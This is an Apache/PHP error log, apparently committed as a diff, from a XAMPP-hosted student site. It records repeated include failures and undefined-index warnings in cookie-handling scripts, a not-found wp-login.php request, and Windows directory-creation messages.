+[Mon Feb 07 20:50:11.361315 2022] [php7:notice] [pid 2356:tid 1460] [client 75.154.233.190:55416] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:50:11.361315 2022] [php7:notice] [pid 2356:tid 1460] [client 75.154.233.190:55416] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:50:11.361315 2022] [php7:notice] [pid 2356:tid 1460] [client 75.154.233.190:55416] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:50:11.361315 2022] [php7:notice] [pid 2356:tid 1460] [client 75.154.233.190:55416] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:50:11.361315 2022] [php7:notice] [pid 2356:tid 1460] [client 75.154.233.190:55416] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 20:50:18.046325 2022] [php7:notice] [pid 2356:tid 1440] [client 172.218.232.87:51468] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:50:18.046325 2022] [php7:notice] [pid 2356:tid 1440] [client 172.218.232.87:51468] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:50:18.046325 2022] [php7:notice] [pid 2356:tid 1440] [client 172.218.232.87:51468] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:50:18.046325 2022] [php7:notice] [pid 2356:tid 1440] [client 172.218.232.87:51468] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:50:18.046325 2022] [php7:notice] [pid 2356:tid 1440] [client 172.218.232.87:51468] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:50:18.046325 2022] [php7:notice] [pid 2356:tid 1440] [client 172.218.232.87:51468] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:51:54.411239 2022] [php7:notice] [pid 2356:tid 1548] [client 172.218.232.87:51507] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:51:54.411239 2022] [php7:notice] [pid 2356:tid 1548] [client 172.218.232.87:51507] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:51:54.411239 2022] [php7:notice] [pid 2356:tid 1548] [client 172.218.232.87:51507] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:51:54.411239 2022] [php7:notice] [pid 2356:tid 1548] [client 172.218.232.87:51507] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:51:54.411239 2022] [php7:notice] [pid 2356:tid 1548] [client 172.218.232.87:51507] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:51:54.411239 2022] [php7:notice] [pid 2356:tid 1548] [client 172.218.232.87:51507] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Stack trace:
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Stack trace:
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Stack trace:
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Stack trace:
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP Stack trace:
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0
+[Mon Feb 07 20:53:07.867681 2022] [php7:notice] [pid 2356:tid 1448] [client 18.237.251.211:59130] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:24.154917 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51409] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:36.934831 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:40.328688 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51410] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:57.233547 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51412] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:57.233547 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51412] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:57.233547 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51412] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:57.233547 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51412] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:57.233547 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51412] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:03:57.233547 2022] [php7:notice] [pid 2356:tid 1456] [client 199.195.149.161:51412] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Notice:  Undefined index: webDelete in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Warning:  Invalid argument supplied for foreach() in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 9, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Warning:  Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:9) in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:01.457277 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   2. header() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:18, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:05.628098 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:05.628098 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:05.628098 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:05.628098 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:05.628098 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:05.628098 2022] [php7:notice] [pid 2356:tid 1536] [client 199.195.149.161:51441] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:06:31.937417 2022] [php7:notice] [pid 2356:tid 1472] [client 199.195.149.161:51446] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 21:06:31.937417 2022] [php7:notice] [pid 2356:tid 1472] [client 199.195.149.161:51446] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 21:06:31.937417 2022] [php7:notice] [pid 2356:tid 1472] [client 199.195.149.161:51446] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 21:06:31.937417 2022] [php7:notice] [pid 2356:tid 1472] [client 199.195.149.161:51446] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 21:06:31.937417 2022] [php7:notice] [pid 2356:tid 1472] [client 199.195.149.161:51446] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 21:06:31.937417 2022] [php7:notice] [pid 2356:tid 1472] [client 199.195.149.161:51446] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 07 21:19:59.539605 2022] [php7:notice] [pid 2356:tid 1436] [client 75.154.233.190:55557] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:19:59.539605 2022] [php7:notice] [pid 2356:tid 1436] [client 75.154.233.190:55557] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:19:59.539605 2022] [php7:notice] [pid 2356:tid 1436] [client 75.154.233.190:55557] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:19:59.555221 2022] [php7:notice] [pid 2356:tid 1436] [client 75.154.233.190:55557] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:19:59.555221 2022] [php7:notice] [pid 2356:tid 1436] [client 75.154.233.190:55557] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:19:59.555221 2022] [php7:notice] [pid 2356:tid 1436] [client 75.154.233.190:55557] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 07 21:20:49.313273 2022] [php7:error] [pid 2356:tid 1436] [client 189.125.37.42:56616] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name already exists.
+Error occurred while processing: name.
+A subdirectory or file c:\steve already exists.
+A subdirectory or file c:\hx already exists.
+A subdirectory or file c:\andy already exists.
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name already exists.
+Error occurred while processing: name.
+[Mon Feb 07 22:06:20.475263 2022] [php7:notice] [pid 2356:tid 1536] [client 104.152.52.113:40377] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Mon Feb 07 22:06:20.475263 2022] [php7:notice] [pid 2356:tid 1536] [client 104.152.52.113:40377] PHP Stack trace:
+[Mon Feb 07 22:06:20.475263 2022] [php7:notice] [pid 2356:tid 1536] [client 104.152.52.113:40377] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+File Not Found
+File Not Found
